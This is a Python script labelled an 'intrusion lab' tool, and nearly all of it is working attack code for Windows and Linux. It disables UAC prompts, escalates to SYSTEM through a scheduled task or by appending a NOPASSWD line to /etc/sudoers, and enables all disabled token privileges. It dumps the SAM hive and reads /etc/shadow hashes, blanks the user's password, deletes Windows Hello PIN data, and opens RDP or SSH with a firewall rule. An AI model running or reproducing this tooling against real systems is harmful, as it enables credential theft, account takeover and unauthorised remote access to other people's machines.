import os
import platform
import subprocess
import getpass
import sys
import logging
import time
import shutil
import ctypes
import socket
import pip

# Configure logging for lab tracking
logging.basicConfig(filename='intrusion_lab.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def install_package(package_name):
    """Install a Python package using pip."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        logging.info(f"Successfully installed {package_name}")
        print(f"[*] Successfully installed {package_name}")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to install {package_name}: {e}")
        print(f"[!] Failed to install {package_name}: {e}")
        return False

# Try to import pywin32 and install if missing
try:
    import win32security
    import win32con
    import win32api
    PYWIN32_AVAILABLE = True
    import pkg_resources
    pywin32_version = pkg_resources.get_distribution("pywin32").version
    logging.info(f"pywin32 version: {pywin32_version}")
    print(f"[*] pywin32 version: {pywin32_version}")
except ImportError:
    logging.warning("pywin32 not installed. Attempting to install...")
    print("[*] pywin32 not installed. Attempting to install...")
    PYWIN32_AVAILABLE = install_package("pywin32")
    if PYWIN32_AVAILABLE:
        import win32security
        import win32con
        import win32api
        import pkg_resources
        pywin32_version = pkg_resources.get_distribution("pywin32").version
        logging.info(f"pywin32 version: {pywin32_version}")
        print(f"[*] pywin32 version: {pywin32_version}")
    else:
        logging.warning("pywin32 installation failed. Privilege enablement will be skipped.")
        print("[*] pywin32 installation failed. Privilege enablement will be skipped.")

def is_admin():
    """Check if the script is running with admin/root privileges."""
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            logging.error("Failed to check admin status on Windows")
            return False
    else:  # Linux/Unix
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False

def enable_privileges(system, user):
    """Attempt to enable all disabled privileges for the current process using ctypes."""
    if not is_admin():
        logging.warning("Privilege enablement skipped: Admin privileges required.")
        print("[!] Admin privileges required for privilege enablement. Skipping...")
        return False, ["[!] Privilege enablement skipped: Admin privileges required."]

    logging.info("Attempting to enable disabled privileges...")
    print("[*] Attempting to enable disabled privileges...")
    enable_output = []

    if system == "Windows":
        if not PYWIN32_AVAILABLE:
            logging.error("Privilege enablement failed: pywin32 module not installed.")
            enable_output.append("[!] Privilege enablement failed: pywin32 module not installed.")
            enable_output.append("[*] Attempted to install pywin32, please restart the script.")
            return False, enable_output

        try:
            # Get current process token
            h_token = ctypes.c_void_p()
            ctypes.windll.advapi32.OpenProcessToken(
                ctypes.windll.kernel32.GetCurrentProcess(),
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
                ctypes.byref(h_token)
            )

            # Get list of all privileges from whoami /priv
            result = subprocess.run(
                ["whoami", "/priv"],
                capture_output=True, text=True, check=True
            )
            disabled_privileges = []
            lines = result.stdout.splitlines()
            for line in lines[4:]:  # Skip header lines
                if line.strip() and "=====" not in line:
                    parts = line.split()
                    if len(parts) >= 2 and parts[-1].lower() == "disabled":
                        privilege_name = parts[0]
                        disabled_privileges.append(privilege_name)

            if not disabled_privileges:
                logging.info("No disabled privileges found to enable.")
                enable_output.append("[*] No disabled privileges found to enable.")
                return True, enable_output

            # Define LUID and LUID_AND_ATTRIBUTES structures
            class LUID(ctypes.Structure):
                _fields_ = [
                    ("LowPart", ctypes.c_ulong),
                    ("HighPart", ctypes.c_long)
                ]

            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("Luid", LUID),
                    ("Attributes", ctypes.c_ulong)
                ]

            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", ctypes.c_ulong),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)
                ]

            SE_PRIVILEGE_ENABLED = 0x00000002

            # Enable each disabled privilege
            for priv in disabled_privileges:
                try:
                    luid = LUID()
                    if not ctypes.windll.advapi32.LookupPrivilegeValueW(None, priv, ctypes.byref(luid)):
                        logging.error(f"Failed to lookup privilege {priv}: {ctypes.GetLastError()}")
                        enable_output.append(f"[!] Failed to lookup privilege {priv}: {ctypes.GetLastError()}")
                        continue

                    priv_struct = LUID_AND_ATTRIBUTES(luid, SE_PRIVILEGE_ENABLED)
                    token_privs = TOKEN_PRIVILEGES()
                    token_privs.PrivilegeCount = 1
                    token_privs.Privileges[0] = priv_struct

                    if not ctypes.windll.advapi32.AdjustTokenPrivileges(
                        h_token, False, ctypes.byref(token_privs), ctypes.sizeof(token_privs), None, None
                    ):
                        logging.error(f"Failed to enable privilege {priv}: {ctypes.GetLastError()}")
                        enable_output.append(f"[!] Failed to enable privilege {priv}: {ctypes.GetLastError()}")
                    else:
                        logging.info(f"Enabled privilege: {priv}")
                        enable_output.append(f"[*] Enabled privilege: {priv}")
                except Exception as e:
                    logging.error(f"Failed to enable privilege {priv}: {e}")
                    enable_output.append(f"[!] Failed to enable privilege {priv}: {e}")

            ctypes.windll.kernel32.CloseHandle(h_token)
            return True, enable_output
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to list privileges for enablement: {e.stderr}")
            enable_output.append(f"[!] Failed to list privileges for enablement: {e.stderr}")
            return False, enable_output
        except Exception as e:
            logging.error(f"Privilege enablement error: {e}")
            enable_output.append(f"[!] Privilege enablement error: {e}")
            return False, enable_output
    elif system == "Linux":
        logging.info("Linux privilege enablement handled via escalation (sudoers/SUID).")
        enable_output.append("[*] Linux privilege enablement handled via escalation (check escalation results).")
        return True, enable_output
    else:
        logging.error("Unsupported system for privilege enablement.")
        enable_output.append("[!] Unsupported system for privilege enablement.")
        return False, enable_output

def list_privileges(system, user):
    """List available privileges for the current user and log them."""
    logging.info("Listing available privileges...")
    print("[*] Listing available privileges...")
    privilege_output = []

    if system == "Windows":
        try:
            result = subprocess.run(
                ["whoami", "/priv"],
                capture_output=True, text=True, check=True
            )
            privileges = []
            lines = result.stdout.splitlines()
            for line in lines[4:]:  # Skip header lines
                if line.strip() and "=====" not in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        privilege_name = parts[0]
                        state = parts[-1]
                        privileges.append(f"{privilege_name}: {state}")
            if privileges:
                logging.info(f"Privileges for {user}:")
                for priv in privileges:
                    logging.info(f"  - {priv}")
                privilege_output.append(f"[*] Privileges for {user}:")
                privilege_output.extend([f"  - {p}" for p in privileges])
            else:
                logging.warning("No privileges found for user.")
                privilege_output.append("[*] No privileges found for user.")
            return True, privilege_output
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to list privileges: {e.stderr}")
            privilege_output.append(f"[!] Failed to list privileges: {e.stderr}")
            return False, privilege_output
        except Exception as e:
            logging.error(f"Privilege listing error: {e}")
            privilege_output.append(f"[!] Privilege listing error: {e}")
            return False, privilege_output
    elif system == "Linux":
        try:
            # Check UID and group memberships
            uid = os.geteuid() if hasattr(os, 'geteuid') else -1
            result = subprocess.run(
                ["id", user],
                capture_output=True, text=True, check=True
            )
            id_output = result.stdout.strip()
            logging.info(f"User ID info for {user}: {id_output}")
            privilege_output.append(f"[*] User ID info for {user}: {id_output}")

            # Check sudo privileges
            result = subprocess.run(
                ["sudo", "-l", "-U", user],
                capture_output=True, text=True, check=True
            )
            sudo_output = result.stdout.strip()
            logging.info(f"Sudo privileges for {user}:")
            logging.info(sudo_output)
            privilege_output.append(f"[*] Sudo privileges for {user}:\n{sudo_output}")
            return True, privilege_output
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to list privileges: {e.stderr}")
            privilege_output.append(f"[!] Failed to list privileges: {e.stderr}")
            return False, privilege_output
        except Exception as e:
            logging.error(f"Privilege listing error: {e}")
            privilege_output.append(f"[!] Privilege listing error: {e}")
            return False, privilege_output
    else:
        logging.error("Unsupported system for privilege listing.")
        privilege_output.append("[!] Unsupported system for privilege listing.")
        return False, privilege_output

def configure_uac():
    """Check and configure UAC settings on Windows (lab purposes)."""
    if platform.system() != "Windows":
        return True

    if not is_admin():
        logging.warning("UAC configuration skipped: Admin privileges required.")
        print("[!] Admin privileges required for UAC configuration. Skipping...")
        return False

    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA"],
            capture_output=True, text=True, check=True
        )
        uac_enabled = "0x1" in result.stdout
        logging.info(f"UAC status: {'Enabled' if uac_enabled else 'Disabled'}")
        print(f"[*] UAC status: {'Enabled' if uac_enabled else 'Disabled'}")

        if uac_enabled:
            result = subprocess.run(
                [
                    "reg", "add", 
                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                    "/v", "ConsentPromptBehaviorAdmin", "/t", "REG_DWORD", "/d", "0", "/f"
                ],
                capture_output=True, text=True, check=True
            )
            logging.info("UAC prompt level set to no prompt (lab setting).")
            print("[*] UAC prompt level set to no prompt. Restart may be required.")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"UAC configuration failed: {e.stderr}")
        print(f"[!] UAC configuration failed: {e.stderr}")
        return False
    except Exception as e:
        logging.error(f"UAC configuration error: {e}")
        print(f"[!] UAC configuration error: {e}")
        return False

def remove_windows_hello(user):
    """Disable Windows Hello PIN authentication for the specified user."""
    if platform.system() != "Windows":
        logging.info("Windows Hello removal skipped: Not a Windows system.")
        print("[*] Windows Hello removal skipped: Not a Windows system.")
        return False, "[*] Windows Hello removal skipped: Not a Windows system."

    if not is_admin():
        logging.warning("Windows Hello removal skipped: Admin privileges required.")
        print("[!] Admin privileges required for Windows Hello removal. Skipping...")
        return False, "[!] Windows Hello removal skipped: Admin privileges required."

    logging.info(f"Attempting to disable Windows Hello PIN for {user}...")
    print(f"[*] Attempting to disable Windows Hello PIN for {user}...")
    try:
        # Disable Windows Hello via registry
        result = subprocess.run(
            [
                "reg", "add",
                "HKLM\\SOFTWARE\\Policies\\Microsoft\\PassportForWork",
                "/v", "Enabled", "/t", "REG_DWORD", "/d", "0", "/f"
            ],
            capture_output=True, text=True, check=True
        )
        logging.info("Windows Hello disabled via registry.")

        # Attempt to remove existing PIN (requires user-specific NGC key reset)
        ngc_path = f"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\{user}"
        if os.path.exists(ngc_path):
            shutil.rmtree(ngc_path, ignore_errors=True)
            logging.info(f"Removed Windows Hello PIN data for {user} at {ngc_path}.")
            print(f"[*] Removed Windows Hello PIN data for {user}.")
        else:
            logging.info(f"No Windows Hello PIN data found for {user}.")
            print(f"[*] No Windows Hello PIN data found for {user}.")
        
        return True, f"[*] Windows Hello PIN disabled for {user}."
    except subprocess.CalledProcessError as e:
        logging.error(f"Windows Hello removal failed: {e.stderr}")
        print(f"[!] Windows Hello removal failed: {e.stderr}")
        return False, f"[!] Windows Hello removal failed: {e.stderr}"
    except Exception as e:
        logging.error(f"Windows Hello removal error: {e}")
        print(f"[!] Windows Hello removal error: {e}")
        return False, f"[!] Windows Hello removal error: {e}"

def elevate_privileges():
    """Attempt to elevate privileges if not already admin/root."""
    if is_admin():
        logging.info("Already running with admin/root privileges.")
        print("[*] Already running with admin/root privileges.")
        return True

    system = platform.system()
    if system == "Windows":
        try:
            if not ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1):
                logging.error("UAC elevation failed.")
                print("[!] UAC elevation failed. Please run as Administrator.")
                return False
            sys.exit(0)
        except Exception as e:
            logging.error(f"UAC elevation error: {e}")
            print(f"[!] UAC elevation error: {e}")
            return False
    elif system == "Linux":
        try:
            result = subprocess.run("sudo -n true", shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                logging.info("Sudo privileges available. Re-running with sudo.")
                print("[*] Sudo privileges available. Re-running with sudo...")
                subprocess.run(f"sudo {sys.executable} {' '.join(sys.argv)}", shell=True)
                sys.exit(0)
            else:
                logging.error("Sudo elevation failed (password required or no sudo access).")
                print("[!] Sudo elevation failed. Run with sudo or check sudoers.")
                return False
        except Exception as e:
            logging.error(f"Sudo elevation error: {e}")
            print(f"[!] Sudo elevation error: {e}")
            return False
    else:
        logging.error("Unsupported system for elevation.")
        print("[!] Unsupported system for privilege elevation.")
        return False

def attempt_privilege_escalation(system):
    """Attempt lab-friendly privilege escalation."""
    logging.info("Attempting lab-specific privilege escalation...")
    print("[*] Attempting lab-specific privilege escalation...")
    escalation_output = []

    if system == "Windows":
        try:
            task_name = "LabEscalationTask"
            cmd = f'schtasks /create /sc once /tn {task_name} /tr "cmd.exe /c {sys.executable} {" ".join(sys.argv)}" /st 23:59 /ru SYSTEM /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                logging.info("Scheduled task created for SYSTEM privilege escalation.")
                escalation_output.append("[*] Scheduled task created for SYSTEM privilege escalation.")
                print("[*] Scheduled task created for escalation. Check task scheduler.")
                subprocess.run(f"schtasks /run /tn {task_name}", shell=True)
                time.sleep(2)
                subprocess.run(f"schtasks /delete /tn {task_name} /f", shell=True)
                return True, escalation_output
            else:
                logging.error(f"Scheduled task creation failed: {result.stderr}")
                escalation_output.append(f"[!] Scheduled task creation failed: {result.stderr}")
                print(f"[!] Scheduled task creation failed: {result.stderr}")
                return False, escalation_output
        except Exception as e:
            logging.error(f"Privilege escalation failed: {e}")
            escalation_output.append(f"[!] Privilege escalation failed: {e}")
            print(f"[!] Privilege escalation failed: {e}")
            return False, escalation_output
    elif system == "Linux":
        try:
            if os.access("/etc/sudoers", os.W_OK):
                logging.info("Writable /etc/sudoers detected. Attempting to add user.")
                print("[*] Writable /etc/sudoers detected. Adding user for escalation...")
                user = getpass.getuser()
                sudoers_backup = "/etc/sudoers.bak"
                shutil.copy("/etc/sudoers", sudoers_backup)
                with open("/etc/sudoers", "a") as f:
                    f.write(f"{user} ALL=(ALL) NOPASSWD:ALL\n")
                logging.info(f"Added {user} to sudoers for escalation. Backup created: {sudoers_backup}")
                escalation_output.append(f"[*] Added {user} to sudoers for escalation. Backup: {sudoers_backup}")
                print(f"[*] Added {user} to sudoers. Run script with sudo.")
                return True, escalation_output
            result = subprocess.run("find / -perm -4000 2>/dev/null | grep '/bin/'", shell=True, capture_output=True, text=True)
            if result.stdout:
                logging.info(f"SUID binaries found: {result.stdout}")
                escalation_output.append(f"[*] SUID binaries found: {result.stdout}")
                print(f"[*] SUID binaries found: {result.stdout}")
                print("[*] Try exploiting SUID binaries manually (e.g., 'find' with -exec).")
                return True, escalation_output
            else:
                logging.error("No exploitable SUID binaries or writable sudoers found.")
                escalation_output.append("[!] No exploitable SUID binaries or writable sudoers found.")
                print("[!] No exploitable SUID binaries or writable sudoers found.")
                return False, escalation_output
        except Exception as e:
            logging.error(f"Privilege escalation failed: {e}")
            escalation_output.append(f"[!] Privilege escalation failed: {e}")
            print(f"[!] Privilege escalation failed: {e}")
            return False, escalation_output
    else:
        logging.error("Unsupported system for escalation.")
        escalation_output.append("[!] Unsupported system for privilege escalation.")
        print("[!] Unsupported system for privilege escalation.")
        return False, escalation_output

def setup_environment():
    """Initialize environment and log system details."""
    system = platform.system()
    user = getpass.getuser()
    admin_status = "Admin" if is_admin() else "Non-Admin"
    logging.info(f"System: {system}, User: {user}, Platform: {platform.platform()}, Privileges: {admin_status}")
    print(f"[*] Initializing on {system} as {user} ({admin_status})")
    return system, user

def get_connection_details():
    """Get machine hostname and IP for RDP/SSH connection, trying multiple methods."""
    logging.info("Retrieving fresh connection details...")
    print("[*] Retrieving fresh connection details...")
    try:
        # Primary method: socket.gethostname and gethostbyname
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        logging.info(f"Connection details: hostname={hostname}, ip={ip_address}")
        return hostname, ip_address
    except socket.gaierror as e:
        logging.warning(f"Primary method failed to get connection details: {e}")
        # Fallback: Try network interfaces
        try:
            import netifaces
        except ImportError:
            logging.info("netifaces not installed. Attempting to install...")
            install_package("netifaces")
            try:
                import netifaces
            except ImportError:
                logging.error("Failed to install netifaces. Returning unknown connection details.")
                return "Unknown", "Unknown"

        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
                for addr in addrs:
                    ip = addr.get('addr')
                    if ip and not ip.startswith('127.'):
                        logging.info(f"Connection details from netifaces: hostname={hostname}, ip={ip}")
                        return hostname, ip
            logging.error("No valid IP addresses found in network interfaces.")
            return hostname, "Unknown"
        except Exception as e:
            logging.error(f"Fallback method failed to get connection details: {e}")
            return "Unknown", "Unknown"

def attempt_password_retrieval(system, user):
    """Attempt to access SAM or /etc/shadow and log/display password/PIN data."""
    if not is_admin():
        logging.warning("Password/PIN retrieval skipped: Admin privileges required.")
        print("[!] Admin privileges required for password/PIN retrieval. Skipping...")
        return False, ["[!] Password/PIN retrieval skipped: Admin privileges required."]

    logging.info("Attempting password/PIN retrieval...")
    print(f"[*] Attempting password/PIN retrieval for user: {user}")
    credential_output = []

    if system == "Windows":
        try:
            # Create dumps directory
            script_dir = os.path.dirname(os.path.abspath(__file__))
            dump_dir = os.path.join(script_dir, "dumps")
            os.makedirs(dump_dir, exist_ok=True)
            if not os.access(dump_dir, os.W_OK):
                logging.error(f"Dump directory {dump_dir} is not writable.")
                credential_output.append(f"[!] Dump directory {dump_dir} is not writable.")
                return False, credential_output

            # Attempt SAM hive export
            temp_sam = os.path.join(dump_dir, "SAM_dump")
            sam_path = r"C:\Windows\System32\config\SAM"
            if os.path.exists(sam_path):
                result = subprocess.run(
                    ["reg", "save", "HKLM\\SAM", temp_sam],
                    capture_output=True, text=True, check=True
                )
                sam_size = os.path.getsize(temp_sam)
                logging.info(f"SAM hive exported to {temp_sam} (size: {sam_size} bytes).")
                credential_output.append(f"[*] SAM password hashes retrieved: {temp_sam} (size: {sam_size} bytes)")
                credential_output.append("[*] Use tools like secretsdump to extract user-specific hashes.")
                success = True
                os.remove(temp_sam)
            else:
                logging.error("SAM file not found at C:\\Windows\\System32\\config\\SAM.")
                credential_output.append("[!] SAM file not found at C:\\Windows\\System32\\config\\SAM.")
                success = False

            # Attempt PIN data retrieval (Windows Hello)
            temp_ngc = os.path.join(dump_dir, "Ngc_dump")
            try:
                result = subprocess.run(
                    ["reg", "save", "HKLM\\SOFTWARE\\Microsoft\\Windows Hello for Business", temp_ngc],
                    capture_output=True, text=True, check=True
                )
                ngc_size = os.path.getsize(temp_ngc)
                logging.info(f"Ngc (PIN) data exported to {temp_ngc} (size: {ngc_size} bytes).")
                credential_output.append(f"[*] PIN data retrieved: {temp_ngc} (size: {ngc_size} bytes)")
                success = True
                os.remove(temp_ngc)
            except subprocess.CalledProcessError as e:
                logging.warning(f"Ngc (PIN) retrieval failed: {e.stderr}")
                credential_output.append(f"[*] PIN retrieval failed: {e.stderr}")
                success = success or False

            # Fallback to net user for user details
            result = subprocess.run(
                ["net", "user", user],
                capture_output=True, text=True, check=True
            )
            logging.info(f"User account info for {user}:")
            logging.info(result.stdout)
            credential_output.append(f"[*] User account info for {user}:\n{result.stdout}")
            if not success:
                success = True
            return success, credential_output
        except subprocess.CalledProcessError as e:
            logging.error(f"SAM/PIN retrieval failed: {e.stderr}")
            credential_output.append(f"[!] SAM/PIN retrieval failed: {e.stderr}")
            return False, credential_output
        except Exception as e:
            logging.error(f"SAM/PIN retrieval error: {e}")
            credential_output.append(f"[!] SAM/PIN retrieval error: {e}")
            return False, credential_output
    elif system == "Linux":
        try:
            shadow_path = "/etc/shadow"
            if os.path.exists(shadow_path):
                with open(shadow_path, "r") as f:
                    content = f.readlines()
                hashes_found = False
                for line in content:
                    if ":" in line and not line.startswith("#"):
                        shadow_user, hash_part = line.split(":", 1)
                        hash_value = hash_part.split(":")[0]
                        if hash_value and hash_value != "*" and shadow_user == user:
                            hashes_found = True
                            logging.info(f"Password hash for {user}: {hash_value}")
                            credential_output.append(f"[*] Password hash for {user}: {hash_value}")
                if hashes_found:
                    credential_output.append("[*] Password hashes retrieved from /etc/shadow (check log for details).")
                    success = True
                else:
                    logging.warning(f"No valid password hashes found for {user} in /etc/shadow.")
                    credential_output.append(f"[*] No valid password hashes found for {user} in /etc/shadow.")
                    success = False
            else:
                logging.error("Shadow file not found.")
                credential_output.append("[!] Shadow file not found.")
                success = False
                # Fallback to /etc/passwd
                with open("/etc/passwd", "r") as f:
                    content = f.read()
                logging.info(f"Fallback: User list retrieved from /etc/passwd:")
                logging.info(content[:100] + "...")
                credential_output.append(f"[*] Fallback: User list retrieved from /etc/passwd:\n{content[:100]}...")
                success = True
            return success, credential_output
        except PermissionError:
            logging.error("Permission denied accessing shadow file.")
            credential_output.append("[!] Permission denied for shadow file.")
            return False, credential_output
        except Exception as e:
            logging.error(f"Shadow retrieval error: {e}")
            credential_output.append(f"[!] Shadow retrieval error: {e}")
            return False, credential_output
    else:
        logging.error("Unsupported system for password/PIN retrieval.")
        credential_output.append("[!] Unsupported system.")
        return False, credential_output

def remove_user_password(system, user):
    """Remove the user's password using system commands."""
    if not is_admin():
        logging.warning("Password removal skipped: Admin privileges required.")
        print("[!] Admin privileges required for password removal. Skipping...")
        return False, "[!] Password removal skipped: Admin privileges required."

    logging.info(f"Attempting to remove password for {user}...")
    print(f"[*] Removing password for {user}...")
    
    if system == "Windows":
        try:
            # Remove password requirement
            result = subprocess.run(
                ["net", "user", user, "/passwordreq:no"],
                capture_output=True, text=True, check=True
            )
            # Set empty password
            result = subprocess.run(
                ["net", "user", user, ""],
                capture_output=True, text=True, check=True
            )
            logging.info(f"Password removed for {user}: {result.stdout}")
            return True, f"[*] Password removed successfully for {user}. No password required."
        except subprocess.CalledProcessError as e:
            logging.error(f"Password removal failed: {e.stderr}")
            print(f"[!] Password removal failed: {e.stderr}")
            return False, f"[!] Password removal failed: {e.stderr}"
        except Exception as e:
            logging.error(f"Password removal error: {e}")
            print(f"[!] Password removal error: {e}")
            return False, f"[!] Password removal error: {e}"
    elif system == "Linux":
        try:
            result = subprocess.run(
                ["passwd", "-d", user],
                capture_output=True, text=True, check=True
            )
            logging.info(f"Password removed for {user}: {result.stdout}")
            return True, f"[*] Password removed successfully for {user}. No password required."
        except subprocess.CalledProcessError as e:
            logging.error(f"Password removal failed: {e.stderr}")
            print(f"[!] Password removal failed: {e.stderr}")
            return False, f"[!] Password removal failed: {e.stderr}"
        except Exception as e:
            logging.error(f"Password removal error: {e}")
            print(f"[!] Password removal error: {e}")
            return False, f"[!] Password removal error: {e}"

def configure_remote_access(system, user):
    """Configure remote access (RDP or SSH) and return detailed status with credentials."""
    if not is_admin():
        logging.warning("Remote access configuration skipped: Admin privileges required.")
        print("[!] Admin privileges required for remote access configuration. Skipping...")
        return False, ["[!] Remote access configuration skipped: Admin privileges required."], None

    logging.info("Configuring remote access...")
    print("[*] Configuring remote access...")
    access_status = []
    hostname, ip_address = get_connection_details()

    # Prepare credential message
    credential_message = f"Username: {user}, Password: None (password removed)"
    if system == "Windows":
        credential_message += ", Windows Hello PIN: None (disabled)"

    if system == "Windows":
        try:
            # Enable RDP
            result = subprocess.run(
                [
                    "reg", "add", 
                    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
                    "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"
                ],
                capture_output=True, text=True, check=True
            )
            logging.info(f"RDP enabled: {result.stdout}")
            rdp_command = f"mstsc /v:{ip_address}"
            logging.info(f"RDP connection: Run '{rdp_command}' with {credential_message}")
            access_status.append("[*] RDP enabled successfully.")
            access_status.append(f"[*] RDP connection: Run '{rdp_command}' with {credential_message}")

            # Check firewall state
            firewall_state = subprocess.run(
                ["netsh", "advfirewall", "show", "currentprofile", "state"],
                capture_output=True, text=True, check=True
            )
            if "State ON" in firewall_state.stdout:
                # Enable RDP firewall rule
                result = subprocess.run(
                    [
                        "netsh", "advfirewall", "firewall", "add", "rule",
                        "name=RDP_Allow", "dir=in", "action=allow", "protocol=TCP", "localport=3389"
                    ],
                    capture_output=True, text=True, check=True
                )
                logging.info(f"RDP firewall rule created: {result.stdout}")
                access_status.append("[*] RDP firewall rule created successfully (TCP port 3389 open).")
            else:
                logging.warning("Windows Firewall is disabled. RDP enabled but firewall rule not needed.")
                access_status.append("[*] Windows Firewall is disabled. RDP enabled without firewall rule.")
            return True, access_status, (rdp_command, credential_message)
        except subprocess.CalledProcessError as e:
            logging.error(f"RDP configuration failed: {e.stderr}")
            rdp_command = f"mstsc /v:{ip_address}"
            logging.info(f"RDP connection: Run '{rdp_command}' with {credential_message} (if enabled)")
            access_status.append(f"[!] RDP configuration failed: {e.stderr}")
            access_status.append("[*] RDP may be enabled but firewall rule not active. Check firewall settings.")
            access_status.append(f"[*] RDP connection: Run '{rdp_command}' with {credential_message} (if enabled)")
            return False, access_status, (rdp_command, credential_message)
        except Exception as e:
            logging.error(f"RDP configuration error: {e}")
            access_status.append(f"[!] RDP configuration error: {e}")
            return False, access_status, None
    elif system == "Linux":
        try:
            if not shutil.which("sshd"):
                logging.info("Installing openssh-server...")
                access_status.append("[*] Installing openssh-server...")
                subprocess.run("sudo apt-get update && sudo apt-get install -y openssh-server", shell=True, check=True)
            result = subprocess.run(
                ["sudo", "systemctl", "enable", "ssh", "--now"],
                capture_output=True, text=True, check=True
            )
            logging.info(f"SSH service enabled: {result.stdout}")
            ssh_command = f"ssh {user}@{ip_address}"
            logging.info(f"SSH connection: Run '{ssh_command}' with {credential_message}")
            access_status.append("[*] SSH service enabled successfully.")
            access_status.append(f"[*] SSH connection: Run '{ssh_command}' with {credential_message}")
            return True, access_status, (ssh_command, credential_message)
        except subprocess.CalledProcessError as e:
            logging.error(f"SSH configuration failed: {e.stderr}")
            access_status.append(f"[!] SSH configuration failed: {e.stderr}")
            return False, access_status, None
        except Exception as e:
            logging.error(f"SSH configuration error: {e}")
            access_status.append(f"[!] SSH configuration error: {e}")
            return False, access_status, None
    else:
        logging.error("Unsupported system for remote access configuration.")
        access_status.append("[!] Unsupported system.")
        return False, access_status, None

def cleanup():
    """Clean up temporary files and configurations."""
    logging.info("Performing cleanup...")
    print("[*] Performing cleanup...")
    try:
        # Remove dump directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
        dump_dir = os.path.join(script_dir, "dumps")
        if os.path.exists(dump_dir):
            shutil.rmtree(dump_dir)
            logging.info(f"Removed dump directory: {dump_dir}")
            print(f"[*] Removed dump directory: {dump_dir}")

        # Revert sudoers changes on Linux
        if platform.system() == "Linux":
            sudoers_backup = "/etc/sudoers.bak"
            if os.path.exists(sudoers_backup):
                shutil.move(sudoers_backup, "/etc/sudoers")
                logging.info("Restored /etc/sudoers from backup")
                print("[*] Restored /etc/sudoers from backup")
    except Exception as e:
        logging.error(f"Cleanup failed: {e}")
        print(f"[!] Cleanup failed: {e}")

def main():
    """Main function to execute the intrusion sequence."""
    logging.info("Intrusion lab script started.")
    print("[*] Starting intrusion lab script...")
    
    # Step 1: Setup
    system, user = setup_environment()
    
    # Step 2: Configure UAC
    configure_uac()
    
    # Step 3: Privilege elevation
    if not is_admin():
        if not elevate_privileges():
            print("[!] Elevation failed. Attempting lab-specific escalation...")
            esc_success, escalation_output = attempt_privilege_escalation(system)
            print("\n[*] Privilege Escalation:")
            print("\n".join(escalation_output))
    
    # Step 4: List privileges
    priv_success, privilege_output = list_privileges(system, user)
    print("\n[*] Privileges:")
    print("\n".join(privilege_output))
    
    # Step 5: Enable disabled privileges
    enable_success, enable_output = enable_privileges(system, user)
    print("\n[*] Privilege Enablement:")
    print("\n".join(enable_output))
    
    # Step 6: Password/PIN retrieval
    pwd_success, credential_output = attempt_password_retrieval(system, user)
    print("\n[*] Credential Retrieval:")
    print("\n".join(credential_output))
    
    # Step 7: Remove password if retrieval failed
    if not pwd_success:
        print(f"[*] Password/PIN retrieval failed for {user}. Removing password...")
        pwd_success, pwd_output = remove_user_password(system, user)
        credential_output.append(pwd_output)
    
    # Step 8: Remove Windows Hello PIN (Windows only)
    if system == "Windows":
        pin_success, pin_output = remove_windows_hello(user)
        credential_output.append(pin_output)
    
    # Step 9: Remote access
    rdp_success, rdp_status, connection_details = configure_remote_access(system, user)
    print("\n[*] Remote Access Configuration Status:")
    print("\n".join(rdp_status))
    
    # Step 10: Cleanup
    cleanup()
    
    # Final output with RDP connection details
    print("\n[*] Final Output:")
    print(f"  Username: {user}")
    print("  Privileges:")
    print("\n".join(privilege_output))
    print("  Privilege Enablement:")
    print("\n".join(enable_output))
    print("  Credentials:")
    print("\n".join(credential_output))
    print("  Remote Access:")
    print("\n".join(rdp_status))
    if connection_details:
        rdp_command, credential_message = connection_details
        print(f"  Connection Command: {rdp_command}")
        print(f"  Credentials: {credential_message}")
    
    logging.info("Intrusion lab script completed.")
    print("[*] Intrusion lab script completed. Check intrusion_lab.log.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print("[!] Script interrupted.")
        cleanup()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Script failed: {e}")
        print(f"[!] Script failed: {e}")
        cleanup()
        sys.exit(1)